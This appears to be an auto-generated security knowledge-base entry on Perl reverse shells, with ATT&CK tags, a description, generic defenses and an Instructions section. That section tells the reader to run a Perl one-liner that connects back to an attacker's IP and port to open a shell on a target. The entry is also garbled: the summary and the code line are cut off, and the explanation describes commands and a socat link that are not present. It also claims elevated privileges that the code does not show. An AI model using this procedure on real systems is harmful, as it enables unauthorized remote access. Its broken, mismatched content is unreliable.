---
id: d56a8da3-7c34-47ed-833e-3c3a620d1b03
name: Perl Reverse Shell Cheat Sheet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.227846+00:00'
updated_at: '2023-04-10T20:25:29.837885+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Custom Command and Control Protocol|T1094 - Custom Command and Control Protocol]]'
- '[[Remote File Copy|T1105 - Remote File Copy]]'
tags:
- '[[Perl]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Perl Reverse Shell Cheat Sheet

## Summary

A Perl reverse shell is a type of shell in which the target machine communicates back to the attacking machine. This technique is often used by attackers to gain remote access to a system, bypassing firewalls and other security measures. In a Perl reverse shell, the attacker sets up a listening ser

## Description

# Description

A Perl reverse shell is a type of shell in which the target machine communicates back to the attacking machine. This technique is often used by attackers to gain remote access to a system, bypassing firewalls and other security measures. In a Perl reverse shell, the attacker sets up a listening server on their machine and waits for the target machine to connect back to them. Once the connection is established, the attacker can execute commands on the target machine and perform various operations.

From a technical perspective, a Perl reverse shell works by creating a socket connection between the attacker and the target machine. The attacker listens on a specific port for incoming connections, while the target machine connects back to the attacker's machine. Once the connection is established, the attacker can execute commands on the target machine and receive the output on their machine.

The business value of a Perl reverse shell is that it allows attackers to gain remote access to a system, which can be used for various purposes such as stealing sensitive data, installing malware, or launching further attacks.

## Requirements

1. Network access to the target system

1. Perl installed on the target system

1. A listening server on the attacker's machine

## Defense

1. Implement network segmentation to prevent attackers from moving laterally within the network

1. Use firewalls and intrusion detection systems to monitor and block suspicious network traffic

1. Regularly update and patch software to prevent known vulnerabilities from being exploited

## Objectives

1. Gain remote access to a target system

1. Execute commands on the target system

1. Bypass firewalls and other security measures

# Instructions

1. To use this command, replace the IP address and port number with your own values. Then, run the command in a terminal to establish a reverse shell connection to the target machine.

**Code**: [[perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S]]

> - The first command creates a socket connection to the specified IP address and port number.
- If the connection is successful, it opens standard input, output, and error streams and executes a shell command with elevated privileges.
- The second command uses the IO module to establish a socket connection to the specified IP address and port number.
- It then opens standard input and output streams and executes any system command entered by the user.
- The provided link is for downloading a static socat binary for Linux x86_64 systems.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Custom Command and Control Protocol|T1094 - Custom Command and Control Protocol]]
- [[Remote File Copy|T1105 - Remote File Copy]]

## Tags

- [[Perl]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]
